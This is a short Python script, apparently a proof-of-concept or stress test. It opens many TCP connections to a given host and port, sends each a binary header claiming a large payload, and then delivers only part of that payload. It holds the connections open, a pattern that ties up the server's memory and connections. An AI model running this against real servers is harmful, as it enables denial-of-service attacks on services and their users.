import socket, struct, sys, time
host, port, K, L, hold = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4]), int(sys.argv[5])
socks, failed = [], 0
for i in range(K):
    try:
        s = socket.create_connection((host, port))
        s.sendall(struct.pack('>BBhBI', 0x04, 0, 1, 0x05, L))
        sent, chunk = 0, b'\0' * 65536
        while sent < L - 1:
            n = min(65536, L - 1 - sent); s.sendall(chunk[:n]); sent += n
        socks.append(s)
    except OSError:
        failed += 1
print("attempted", K, "send_failed", failed, flush=True); time.sleep(hold)
for s in socks: s.close()
